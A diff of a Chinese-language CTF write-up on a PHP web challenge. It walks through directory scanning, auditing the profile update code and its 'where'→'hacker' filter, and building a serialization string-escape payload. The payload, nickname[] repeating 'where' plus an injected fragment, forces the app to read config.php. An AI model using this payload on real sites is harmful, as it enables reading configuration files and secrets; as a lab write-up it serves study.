@@ -2,16 +2,25 @@
 
 ---
 首页长这样
+
 ![[Pasted image 20221219085636.png|200]]
+
 试密码和`sql`注入没试出来，八成是要扫目录
 
 ![[Pasted image 20221219105158.png|500]]
+
 下载下来
+
 ![[Pasted image 20221219113827.png|300]]
+
 访问`/register.php`进行一个账号的注册
+
 ![[Pasted image 20221219113932.png|200]]
+
 来到`/profile.php`，然后又跳转到`/update.php`
+
 ![[Pasted image 20221219114033.png|200]]
+
 有一个`upload`文件夹，`update.php`可以上传图片
 
 ---
@@ -41,6 +50,7 @@ $user->update_profile($username, serialize($profile));
 echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
 ```
 最后向`$user->update_profile`传递了经过序列化的`$profile`
+
 `update_profile`在`class.php`中
 ```php
 public function update_profile($username, $new_profile) {
@@ -64,9 +74,13 @@ public function filter($string) {
 }
 ```
 对序列化结果进行过滤（大喜
+
 八成是字符串逃逸了
+
 利用`nickname`制造逃逸，通过传递数组绕过`preg_match`
+
 `where`是5个字符，`hacker`是6个字符，利用对`where`的过滤把`nickname`中的非法字符顶出去
+
 目标是读取`config.php`
 ```php
 <?php
@@ -96,22 +110,20 @@ public function filter($string) {
 ";}s:5:"photo";s:10:"config.php";}
 ```
 长度为34
+
 于是`payload`为
 ```
 nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
 ```
+
 ![[Pasted image 20221219184827.png|500]]
 
----
 ![[Pasted image 20221219184912.png|500]]
 
----
 ![[Pasted image 20221219184953.png|500]]
 
----
 ![[Pasted image 20221219185026.png|500]]
 
----
 ![[Pasted image 20221219185118.png|700]]
 
 #Web #PHP #目录爆破 #代码审计 #反序列化 #字符串逃逸 #HTTP #编码 
